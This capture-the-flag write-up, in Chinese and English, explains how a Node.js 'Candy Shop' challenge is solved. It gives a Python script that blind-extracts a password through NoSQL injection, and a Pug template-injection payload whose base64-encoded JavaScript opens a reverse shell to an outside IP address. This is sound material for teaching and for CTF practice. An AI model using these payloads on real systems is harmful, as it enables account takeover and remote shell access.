# Candy Shop WP

## 中文

商店可以注册和登录 但是新注册的账号都是没有激活的 2333

```javascript
static add = async (username, password, active) => {
    let user = {
        username: username,
        password: password,
        active: active
    }
    let client = await connect()
    await client.db('test').collection('users').insertOne(user)
}
```

翻源码可以看到有一个激活的账号 但是你不知道密码>_<

```javascript
let users = client.db('test').collection('users')
users.deleteMany(err => {
    if (err) {
        console.log(err)
    } else {
        users.insertOne({
            username: 'rabbit',
            password: process.env.PASSWORD,
            active: true
        })
    }
})
```

/login路由留了一个NoSQL注入

```javascript
router.post('/login', async (req, res) => {
    let {username, password} = req.body
    // 平平无奇的NoSQL注入
    let rec = await db.Users.find({username: username, password: password})
    if (rec) {
        // 这里算是一个提示
        if (rec.username === username && rec.password === password) {
            res.cookie('token', rec, {signed: true})
            res.redirect('/shop')
        } else {
            res.render('login', {error: 'You Bad Bad >_<'})
        }
    } else {
        res.render('login', {error: 'Login Failed!'})
    }
})
```

可以通过两个不同回显来盲注出密码

```python
import requests
from urllib.parse import quote

url = 'http://localhost:3000/user/login'

result = ''
for i in range(1, 233):
	ascii_min = 0
	ascii_max = 128
	while ascii_max - ascii_min > 1:
		mid = (ascii_min + ascii_max) // 2
		data = 'username=rabbit&password[$lt]=' + quote(result + chr(mid))
		r = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
		if 'Bad' in r.text:
			ascii_max = mid
		else:
			ascii_min = mid
		print(ascii_min, ascii_max, mid)
	if ascii_min == 0:
		break
	result += chr(ascii_min)
	print(result)

print(result)
```

/order路由这里 

```javascript
router.post('/order', checkLogin, checkActive, async (req, res) => {
    let {username, candyname, address} = req.body
    let tpl_path = path.join(__dirname, '../views/confirm.pug')
    fs.readFile(tpl_path, (err, result) => {
        if (err) {
            res.render('error', {error: 'Fail to load template!'})
        } else {
            // 模板渲染前的文本替换 所以要干什么你懂的
            let tpl = result
                .toString()
                .replace('USERNAME', username)
                .replace('CANDYNAME', candyname)
                .replace('ADDRESS', address)
            res.send(pug.render(tpl, options={filename: tpl_path}))
        }
    })
})
```

模板部分内容可控 所以这里可以执行任意的js代码 2333

比如说反弹一个shell

```
2333' evil=function(){eval(atob("dmFyIG5ldD1wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgibmV0Iik7CnZhciBjcD1wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpOwp2YXIgc2g9Y3Auc3Bhd24oIi9iaW4vc2giLFtdKTsKdmFyIGNsaWVudD1uZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCg3Nzc3LCI4LjEzNS4xNS43MyIsKCk9PntjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO30pOw=="));}() rua='2333
```

## English

The website has register and login, but the newly registered account is not active lol.

```javascript
static add = async (username, password, active) => {
    let user = {
        username: username,
        password: password,
        active: active
    }
    let client = await connect()
    await client.db('test').collection('users').insertOne(user)
}
```

There is an active account in the database but you don't know the password.

```javascript
let users = client.db('test').collection('users')
users.deleteMany(err => {
    if (err) {
        console.log(err)
    } else {
        users.insertOne({
            username: 'rabbit',
            password: process.env.PASSWORD,
            active: true
        })
    }
})
```

There is a NoSQL injection vulnerability in /login

```javascript
router.post('/login', async (req, res) => {
    let {username, password} = req.body
    let rec = await db.Users.find({username: username, password: password})
    if (rec) {
        if (rec.username === username && rec.password === password) {
            res.cookie('token', rec, {signed: true})
            res.redirect('/shop')
        } else {
            res.render('login', {error: 'You Bad Bad >_<'})
        }
    } else {
        res.render('login', {error: 'Login Failed!'})
    }
})
```

So you can use it to get the password.

```python
import requests
from urllib.parse import quote

url = 'http://localhost:3000/user/login'

result = ''
for i in range(1, 233):
	ascii_min = 0
	ascii_max = 128
	while ascii_max - ascii_min > 1:
		mid = (ascii_min + ascii_max) // 2
		data = 'username=rabbit&password[$lt]=' + quote(result + chr(mid))
		r = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
		if 'Bad' in r.text:
			ascii_max = mid
		else:
			ascii_min = mid
		print(ascii_min, ascii_max, mid)
	if ascii_min == 0:
		break
	result += chr(ascii_min)
	print(result)

print(result)
```

After you login, you can control some parts of template file before it be rendered.

```javascript
router.post('/order', checkLogin, checkActive, async (req, res) => {
    let {username, candyname, address} = req.body
    let tpl_path = path.join(__dirname, '../views/confirm.pug')
    fs.readFile(tpl_path, (err, result) => {
        if (err) {
            res.render('error', {error: 'Fail to load template!'})
        } else {

            let tpl = result
                .toString()
                .replace('USERNAME', username)
                .replace('CANDYNAME', candyname)
                .replace('ADDRESS', address)
            res.send(pug.render(tpl, options={filename: tpl_path}))
        }
    })
})
```

So you can execute arbitrary javascript codes here.

For example, a reverse shell.

```
2333' evil=function(){eval(atob("dmFyIG5ldD1wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgibmV0Iik7CnZhciBjcD1wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpOwp2YXIgc2g9Y3Auc3Bhd24oIi9iaW4vc2giLFtdKTsKdmFyIGNsaWVudD1uZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCg3Nzc3LCI4LjEzNS4xNS43MyIsKCk9PntjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO30pOw=="));}() rua='2333
```

